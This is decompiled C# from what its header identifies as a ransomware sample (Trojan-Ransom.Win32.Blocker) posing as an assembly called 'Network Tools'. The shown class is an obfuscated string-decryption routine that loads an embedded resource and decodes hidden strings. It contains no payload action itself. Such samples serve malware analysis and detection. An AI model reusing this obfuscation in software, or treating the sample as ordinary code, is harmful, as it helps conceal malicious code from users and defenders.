// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Network Tools, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3D44B499-E90D-43D9-B3D4-0907D845BDEE
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\VHO-Trojan-Ransom.Win32.Blocker.gen-1cbd4cd4d1c5c7cbd83952b4b7ee45c65974de5e2c3daefb8e5a66e5f4de13a3.exe

using \u0003;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace \u0003
{
  internal class \u0002
  {
    private static string \u0001 = "0";
    private static string \u0002 = "143";
    private static byte[] \u0003;
    private static Hashtable \u0004;
    private static bool \u0005;
    private static int \u0006;

    public static string \u0001([In] int obj0)
    {
      int num1 = obj0;
      int num2;
      int num3;
      string str1;
      int num4;
      while (true)
      {
        int num5 = \u0002.\u0006;
        int num6 = num1 - num5;
        if (true)
          goto label_19;
label_2:
        if (\u0002.\u0005)
        {
          str1 = (string) \u0003\u0002.\u007E\u0091\u0002((object) \u0002.\u0004, (object) obj0);
          switch (str1)
          {
            case null:
              break;
            default:
              goto label_20;
          }
        }
        int num7 = 0;
        if (num7 == 0)
          goto label_21;
label_9:
        if ((num7 & 64) != 0)
        {
          int num8 = (num3 & 31) << 24;
          byte[] numArray1 = \u0002.\u0003;
          int index1 = num2;
          int num9 = index1 + 1;
          int num10 = (int) numArray1[index1] << 16;
          int num11 = num8 + num10;
          byte[] numArray2 = \u0002.\u0003;
          int index2 = num9;
          int num12 = index2 + 1;
          int num13 = (int) numArray2[index2] << 8;
          int num14 = num11 + num13;
          byte[] numArray3 = \u0002.\u0003;
          int index3 = num12;
          num2 = index3 + 1;
          int num15 = (int) numArray3[index3];
          num4 = num14 + num15;
          if (false)
          {
            num1 = num4;
            continue;
          }
          goto label_12;
        }
        else
          goto label_10;
label_21:
        num2 = obj0;
        if (true)
        {
          num3 = (int) \u0002.\u0003[num2++];
          if ((num3 & 128) == 0)
            break;
        }
        num7 = num3;
        goto label_9;
label_19:
        obj0 = num6;
        goto label_2;
      }
      int num16 = num3;
      if (num16 == 0)
        return string.Empty;
      goto label_13;
label_10:
      num16 = ((num3 & 63) << 8) + (int) \u0002.\u0003[num2++];
      goto label_13;
label_12:
      num16 = num4;
label_13:
      try
      {
        byte[] numArray = \u0005\u0002.\u0093\u0002(\u0004\u0002.\u007E\u0092\u0002((object) \u0089.\u0016\u0002(), \u0002.\u0003, num2, num16));
        string str2 = \u000F.\u001B(\u0004\u0002.\u007E\u0092\u0002((object) \u0089.\u0016\u0002(), numArray, 0, numArray.Length));
        if (\u0002.\u0005)
        {
          try
          {
            \u0006\u0002.\u007E\u0094\u0002((object) \u0002.\u0004, (object) obj0, (object) str2);
          }
          catch
          {
          }
        }
        return str2;
      }
      catch
      {
        return (string) null;
      }
label_20:
      return str1;
    }

    static \u0002()
    {
      int num1;
      if (true)
      {
        \u0002.\u0003 = (byte[]) null;
        \u0002.\u0004 = (Hashtable) null;
        \u0002.\u0005 = false;
        num1 = 0;
      }
      else
        goto label_4;
label_2:
      int num2;
      if (num1 == 0)
      {
        \u0002.\u0006 = num1;
      }
      else
      {
        num2 = num1;
        goto label_5;
      }
label_4:
      num2 = \u001F.\u009F(\u0002.\u0001, "1") ? 1 : 0;
label_5:
      if (num2 != 0)
      {
        if (false)
          return;
        \u0002.\u0005 = true;
        \u0002.\u0004 = new Hashtable();
      }
      num1 = \u0007\u0002.\u0095\u0002(\u0002.\u0002);
      if (true)
      {
        \u0002.\u0006 = num1;
        Assembly assembly = \u0002\u0002.\u0090\u0002();
        Stream stream = \u0008\u0002.\u007E\u0096\u0002((object) assembly, "{ef5f9e85-4006-40fb-83e9-ebb57091f3cb}");
        try
        {
          int length = \u000F\u0002.\u0098\u0002(\u000E\u0002.\u007E\u0097\u0002((object) stream));
          \u0002.\u0003 = new byte[length];
          do
          {
            int num3 = \u0010\u0002.\u007E\u0099\u0002((object) stream, \u0002.\u0003, 0, length);
            \u0008.\u007E\u0015((object) stream);
          }
          while (false);
        }
        finally
        {
          if (stream != null)
            \u0008.\u007E\u000E((object) stream);
        }
      }
      else
        goto label_2;
    }
  }
}
